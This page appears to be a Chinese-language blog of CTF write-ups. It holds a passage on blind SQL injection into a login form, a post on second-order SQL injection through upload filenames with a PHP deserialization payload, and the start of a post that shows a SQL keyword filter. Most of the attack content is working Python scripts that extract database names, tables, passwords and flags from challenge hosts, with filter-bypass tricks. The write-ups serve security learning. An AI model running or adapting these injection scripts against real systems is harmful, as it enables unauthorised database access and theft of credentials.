<h4 id="爆破表脚本："><a href="#爆破表脚本：" class="headerlink" title="爆破表脚本："></a><strong>爆破表脚本：</strong></h4><p>这个确实花了我好多时间，主要原因还是在于语句的书写上 有个细节，就是我们的表后面那个字段也是需要空出来的，不然就会造成改字段没比完的情况,还有另一个细节是一些特殊字符是不能去进行比较的，不然的话就直接出错了。。。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection_s</span>():</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=<span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">            payload_2=<span class="string">f&quot;admin&#x27;and ((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;<span class="subst">&#123;fina_wod+a[j]&#125;</span>&#x27;,&#x27;&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 0,1))#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_2,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = s.post(url=url, data=data).text</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                fina_wod+=a[j<span class="number">-1</span>]</span><br><span class="line">                print(fina_wod)</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210813160601.png" alt="img" style="zoom:67%;">
爆破出来以后有一个admin，还有另外一个是f11114g

<h4 id="爆破flag"><a href="#爆破flag" class="headerlink" title="爆破flag"></a>爆破flag</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table 表名 limit 1,1;</span><br></pre></td></tr></table></figure>

<p>之前为什么需要知道列名？因为列多，如果我们直接用substr截取的话会报错<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210814090402.png" alt="img" style="zoom:67%;"><br>那么意味着，如果只有一列 那么substr截取就可以不用列名也可以选取了：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210814090836.png" alt="img" style="zoom:50%;"><br>所这里写脚本就很容易了直接用爆破库名的脚本来就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table f11114g limit 0,1</span><br></pre></td></tr></table></figure>

<p>需要注意的是 第一行没有flag，第二行才是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">pay_lo</span>):</span><span class="comment">#库名和版本</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_1=<span class="string">f&quot;admin&#x27;and ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_1,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_wod += chr(mid)</span><br><span class="line">        print(fina_wod)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;8848f380-dce6-4184-a3d8-430e72c4eca0&#125;</span><br></pre></td></tr></table></figure>

<p>完整脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">pay_lo</span>):</span><span class="comment">#库名和版本</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_1=<span class="string">f&quot;admin&#x27;and ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_1,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;password error!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_wod += chr(mid)</span><br><span class="line">        print(fina_wod)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection_s</span>():</span><span class="comment">#表名</span></span><br><span class="line">    fina_wod=<span class="string">&quot;&quot;</span></span><br><span class="line">    a=<span class="string">&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">62</span>):</span><br><span class="line">            payload_2=<span class="string">f&quot;admin&#x27;and ((&#x27;def&#x27;,&#x27;ctf&#x27;,&#x27;<span class="subst">&#123;fina_wod+a[j]&#125;</span>&#x27;,&#x27;&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>:payload_2,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = s.post(url=url, data=data).text</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username error&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                fina_wod+=a[j<span class="number">-1</span>]</span><br><span class="line">                print(fina_wod)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_co</span>():</span><span class="comment">#探测表在第几个</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27;and/**/(&#x27;def&#x27;,&#x27;ct&#x27;,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit <span class="subst">&#123;i&#125;</span>,1)#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">        data1=&#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>:payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>:<span class="string">&quot;123&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data1)</span></span><br><span class="line">        <span class="comment">#print(s.post(url=url,data=data1).text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;username error!&quot;</span> <span class="keyword">in</span> s.post(url=url,data=data1).text:</span><br><span class="line">            print(<span class="string">&quot;ctf库在第&quot;</span>,i,<span class="string">&quot;列&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctf</span></span><br><span class="line">    <span class="comment">#payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2</span></span><br><span class="line">    payload=<span class="string">&quot;table f11114g limit 1,1&quot;</span></span><br><span class="line">    <span class="comment">#search_co()</span></span><br><span class="line">    <span class="comment">#print_word()</span></span><br><span class="line">    sql_injection(payload)</span><br><span class="line">    <span class="comment">#sql_injection_s()</span></span><br></pre></td></tr></table></figure>

<h2 id="union联合"><a href="#union联合" class="headerlink" title="union联合"></a>union联合</h2><h3 id="fuzz过滤内容"><a href="#fuzz过滤内容" class="headerlink" title="fuzz过滤内容"></a>fuzz过滤内容</h3><p>看了一下过滤了最重要的info库，就意味着大概率是无列名盲注了，然后过滤了一些比较符号，还有likerlike等正则匹配函数，那么本题似乎只能用case when了的感觉<br>接下</p>
<h3 id="判断注入类型-1"><a href="#判断注入类型-1" class="headerlink" title="判断注入类型"></a>判断注入类型</h3><p>布尔盲注，回显分为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试语句：:root&#39;and&#x2F;**&#x2F;case&#x2F;**&#x2F;1&#x2F;**&#x2F;when&#x2F;**&#x2F;1&#x2F;**&#x2F;then&#x2F;**&#x2F;1&#x2F;**&#x2F;else&#x2F;**&#x2F;0&#x2F;**&#x2F;end#</span><br><span class="line">true:welcomt admin</span><br><span class="line">false:wrong</span><br></pre></td></tr></table></figure>

<h3 id="编写盲注脚本："><a href="#编写盲注脚本：" class="headerlink" title="编写盲注脚本："></a>编写盲注脚本：</h3><h4 id="构造注入语句"><a href="#构造注入语句" class="headerlink" title="构造注入语句"></a>构造注入语句</h4><p>这题的截取函数基本都过滤了，所以这里使用<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818110110.png" alt="img" style="zoom:67%;"></p>
<p>接下来就是跑表名，由于in库被过滤了，这里试了一下 发现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select group_concat(table_name) from sys.schema_table_statistics;</span><br></pre></td></tr></table></figure>

<p>是可以的<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210818205724.png" alt="img"></p>
<p>就可以跑出表名了<br>接下来使用union无列名盲注</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select a.1 from (select 1,2 union select * from &#96;SeCrrreT&#96;)a limit 1,2</span><br></pre></td></tr></table></figure>

<p>得到表名以后 直接select * from SeCrrreT跑不出来，所以可以猜想肯定不止一行，所以后面要加limit 然后用无列名盲注，去尝试字段数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://a.y1ng.vip:1119/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    data1=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">            payload_tr=<span class="string">f&quot;root&#x27;and case ascii(reverse(left((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>))) when <span class="subst">&#123;j&#125;</span> then 1 else 0 end#&quot;</span>.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;/**/&quot;</span>)</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;username&quot;</span>:payload_tr,</span><br><span class="line">                <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1141&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Welcome Admin!&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                data1+=chr(j)</span><br><span class="line">                print(data1)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#payload=&quot;database()&quot;#ctfgame</span></span><br><span class="line">    <span class="comment">#payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT</span></span><br><span class="line">    payload=<span class="string">&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;</span><span class="comment">#flag&#123;fab99a66-23db-47b1-9db4-9262664d76a8&#125;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>我用的是case when进行盲注，看了一下师傅的 ，他使用的是between来替代没有了的比较函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;username&quot; : f&quot;root&#39; and (ascii(reverse(left((&#123;select&#125;),&#123;i&#125;))) between &#123;ascii&#125; and &#123;ascii+1&#125;)#&quot;.replace(&quot; &quot;, &quot;&#x2F;**&#x2F;&quot;),</span><br></pre></td></tr></table></figure>

<p>这是他的语句，收藏起来了~</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/09/SQL%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-GACTF-carefulleyes/">SQL二次注入-GACTF-carefulleyes</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-09</time><div class="content"><h2 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h2><p>首先看看题目的源码，rename.php在这里是存在二次注入的，新的文件名会替换旧的文件名，新文件名又将被直接取出</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;common.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">&#x27;oldname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">&#x27;newname&#x27;</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$req[&#x27;oldname&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">        $info = $db-&gt;query(<span class="string">&quot;select * from `file` where `filename`=&#x27;<span class="subst">&#123;$result[&#x27;filename&#x27;]&#125;</span>&#x27;&quot;</span>);</span><br><span class="line">        $info = $info-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;oldfilename : &quot;</span>.$info[<span class="string">&#x27;filename&#x27;</span>].<span class="string">&quot; will be changed.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;old file doesn&#x27;t exists!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>大致分析一下：</strong><br>假设我们输入的文件名为：<br><code>1&#39;or 1=1#.jpg</code>那么插入到数据库当中以后<br>将变成<br><code>1&#39;or 1=1#</code>那么后面取出数据的时候</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from &#96;file&#96; where &#96;filename&#96;&#x3D;&#39;&#123;$result[&#39;filename&#39;]&#125;&#39;</span><br><span class="line">select * from &#96;file&#96; where &#96;filename&#96;&#x3D;&#39;1&#39;or 1&#x3D;1#&#39;</span><br></pre></td></tr></table></figure>

<p>一开始测试的时候 我是用and的，但是当我改成1’and 1=2的时候回显结果也是一样的？<code>1&#39;and 1=1#</code><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810144319.png" alt="img" style="zoom:50%;"></p>
<p>后来我改成了<code>1&#39;or 1=1</code>,发现页面有了不一样的回显</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810144903.png" alt="img" style="zoom:67%;">

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210810150847.png" alt="img"></p>
<p>所以可以进行布尔盲注</p>
<h2 id="脚本编写"><a href="#脚本编写" class="headerlink" title="脚本编写"></a>脚本编写</h2><p>感觉最近写脚本越来越得心应手了虽然脚本都很简单哈哈哈哈</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url1=<span class="string">&quot;http://b.y1ng.vip:2016/upload.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://b.y1ng.vip:2016/rename.php&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>(<span class="params">str</span>):</span></span><br><span class="line">    content=<span class="string">&quot;aaaa&quot;</span></span><br><span class="line">    file1 = &#123;</span><br><span class="line">        <span class="string">&#x27;upfile&#x27;</span>:(<span class="string">f&quot;1&#x27;<span class="subst">&#123;str&#125;</span>#.jpg&quot;</span>,content,<span class="string">&quot;image/jpeg&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    r = s.post(url=url1, files=file1).text</span><br><span class="line">    <span class="comment">#print(r)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rename</span>(<span class="params">str</span>):</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;oldname&quot;</span>:<span class="string">f&quot;1&#x27;<span class="subst">&#123;str&#125;</span>#&quot;</span>,</span><br><span class="line">        <span class="string">&quot;newname&quot;</span>:<span class="string">&quot;abc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    r=s.post(url=url2,data=data).text</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_injection</span>(<span class="params">payload</span>):</span></span><br><span class="line">    fina_word=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        low=<span class="number">32</span></span><br><span class="line">        high=<span class="number">128</span></span><br><span class="line">        mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">            payload_fina=<span class="string">f&quot;or ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">            upload(payload_fina)</span><br><span class="line">            r=rename(payload_fina)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Comp 1_100002&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high=mid</span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(mid==<span class="number">32</span> <span class="keyword">or</span> mid==<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        fina_word+=chr(mid)</span><br><span class="line">        print(fina_word)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># payload=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment"># payload=&quot;&quot;</span></span><br><span class="line">    payload=<span class="string">&quot;select group_concat(password) from user&quot;</span></span><br><span class="line">    sql_injection(payload)</span><br></pre></td></tr></table></figure>

<p>这样就可以注出用户名和密码了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">XM GaCtF5QL1</span><br></pre></td></tr></table></figure>

<h2 id="反序列化分析"><a href="#反序列化分析" class="headerlink" title="反序列化分析"></a>反序列化分析</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $username = strtolower(trim(mysql_escape_string($username)));</span><br><span class="line">        $password = strtolower(trim(mysql_escape_string($password)));</span><br><span class="line"></span><br><span class="line">        $sql = sprintf(<span class="string">&quot;SELECT * FROM user WHERE username=&#x27;%s&#x27; AND password=&#x27;%s&#x27;&quot;</span>, $username, $password);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        $obj = $db-&gt;query($sql);</span><br><span class="line"></span><br><span class="line">        $obj = $obj-&gt;fetch_assoc();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">global</span> $FLAG;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="literal">false</span> &amp;&amp; $obj[<span class="string">&#x27;privilege&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>  ) &#123;</span><br><span class="line">			<span class="keyword">die</span>($FLAG);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;Admin only!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现，只要登录成功，就可以拿到flag，此时我们已经得到账号密码了，构造一下即可,看了一下源码，在upload.php中存在反序列化的点,方法很少，所以pop链其实很好看出，就是destruct的时候会使用call_user_func_array，所以只要对method和args进行赋值即可：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XCTFGG</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method;</span><br><span class="line">    <span class="keyword">private</span> $args;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$method, $args</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> XCTFGG(<span class="string">&quot;login&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;XM&quot;</span>,<span class="string">&quot;GaCtF5QL1&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>但是不知道为啥没拿到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">upload successfully!&lt;br &#x2F;&gt;</span><br><span class="line">&lt;b&gt;Fatal error&lt;&#x2F;b&gt;:  Uncaught Error: Call to undefined function mysql_escape_string() in &#x2F;var&#x2F;www&#x2F;html&#x2F;common.php:39</span><br><span class="line">Stack trace:</span><br><span class="line">#0 &#x2F;var&#x2F;www&#x2F;html&#x2F;common.php(59): XCTFGG-&gt;login(&#39;XM&#39;, &#39;GaCtF5QL1&#39;)</span><br><span class="line">#1 &#x2F;var&#x2F;www&#x2F;html&#x2F;upload.php(47): XCTFGG-&gt;__destruct()</span><br><span class="line">#2 &#123;main&#125;</span><br><span class="line">  thrown in &lt;b&gt;&#x2F;var&#x2F;www&#x2F;html&#x2F;common.php&lt;&#x2F;b&gt; on line &lt;b&gt;39&lt;&#x2F;b&gt;&lt;br &#x2F;&gt;</span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/08/02/2021-hf-hatenum%E5%A4%8D%E7%8E%B0/">2021-hf-hatenum复现</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-08-02</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天主要跟着YING师父的wp学习一下其中的知识点~</p>
<h2 id="分析源码"><a href="#分析源码" class="headerlink" title="分析源码"></a>分析源码</h2><p>在login函数中看到，有三种回显，一种是成功，另外一个是error还有一个是fail，所以我们应该构造一个语句，可以有回显error还有fail，那么就是一个要报错一个要false</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$username,$password,$code</span>)</span>&#123;</span><br><span class="line">		$res = <span class="keyword">$this</span>-&gt;conn-&gt;query(<span class="string">&quot;select * from users where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;conn-&gt;error)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			$content = $res-&gt;fetch_array();</span><br><span class="line">			<span class="keyword">if</span>($content[<span class="string">&#x27;code&#x27;</span>]===$_POST[<span class="string">&#x27;code&#x27;</span>])&#123;</span><br><span class="line">				$_SESSION[<span class="string">&#x27;username&#x27;</span>] = $content[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;success&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="string">&#x27;fail&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;		</span><br></pre></td></tr></table></figure>

<p>这里过滤了一系列字符,包括union，select，这里最糟糕的是他过滤了单引号，因为我们通常是采用单引号来闭合语句的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/union|select|or|and|\&#x27;|&quot;|sleep|benchmark|regexp|repeat|get_lock|count|=|&gt;|&lt;| |\*|,|;|\r|\n|\t|substr|right|left|mid/i&#x27;</span>, $str))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Hack detected&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还有一个字符数目限制，限制字符长度在9个以内</p>
